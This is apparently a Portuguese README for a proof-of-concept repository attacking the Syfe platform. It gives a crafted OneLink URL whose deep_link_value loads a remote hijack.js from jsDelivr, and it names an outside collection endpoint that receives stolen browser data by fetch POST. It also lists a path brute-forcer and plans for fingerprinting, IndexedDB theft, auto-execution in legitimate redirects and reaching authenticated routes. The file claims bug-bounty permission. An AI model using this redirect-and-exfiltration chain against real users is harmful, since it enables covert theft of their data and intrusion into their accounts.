# syfe-poc-bypass

> Proof-of-Concept para exploração remota na plataforma [Syfe](https://www.syfe.com), com foco em redirecionamento controlado via OneLink (AppsFlyer), coleta furtiva de dados e possível bypass de CSP.

---

## 🧪 Objetivo

Demonstrar como o endpoint `syfe.onelink.me` pode ser utilizado como vetor de redirecionamento e execução remota de scripts, incluindo exfiltração de dados sensíveis do navegador em contexto de usuário.

---

## 📌 Ponto de Entrada

Utilizando o `deep_link_value` do OneLink:

https://syfe.onelink.me/test?pid=facebook&deep_link_value=https://cdn.jsdelivr.net/gh/SEU_USUARIO/syfe-poc-bypass@main/hijack.js

yaml
Copiar
Editar

Ao ser carregado pelo OneLink, o navegador interpreta e executa o script remoto que coleta dados do usuário e os envia para o servidor controlado pelo pesquisador.

---

## 📁 Arquivos

- `hijack.js`: script principal de coleta furtiva.
- `exfiltration/stealth-collector.js`: versão estendida (a ser implementada) com coleta de IndexedDB, rede e fingerprint.
- `onelink/fuzz_onelink.py`: script para brute-force de caminhos válidos no domínio `syfe.onelink.me`.
- `proof/`: evidências da execução remota (como GIFs ou HAR).

---

## 🔒 Considerações de Segurança

Este repositório é de uso **exclusivamente educacional e ético**. Toda exploração foi realizada no contexto de programas de Bug Bounty com permissão explícita (neste caso, Syfe via HackerOne).

---

## 📤 Endereço de coleta

Todos os dados coletados são enviados via `fetch` para:

https://premiumvalue.store/poc

yaml
Copiar
Editar

Esse endpoint está sob controle do pesquisador e processa as requisições via `POST` com `Content-Type: application/json`.

---

## 💡 Próximos passos

- [ ] Incluir coleta de `IndexedDB`
- [ ] Implementar fingerprint completo (Canvas, WebGL, Plugins, Fonts)
- [ ] Adicionar autoexecução em redirecionamentos legítimos
- [ ] Explorar subrotas autenticadas após redirecionamento
